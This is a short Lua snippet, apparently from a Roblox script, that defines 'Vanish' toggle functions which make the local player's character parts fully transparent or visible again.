-- VANISH
-- ==============================================
local Vanish = { active = false }

local function enableVanish()
    Vanish.active = true
    local char = LP.Character
    if char then
        for _, v in ipairs(char:GetDescendants()) do
            if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Accessory") then
                v.Transparency = 1
            end
        end
    end
end

local function disableVanish()
    Vanish.active = false
    local char = LP.Character
    if char then
        for _, v in ipairs(char:GetDescendants()) do
            if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Accessory") then
                v.Transparency = 0
            end
        end
    end
end

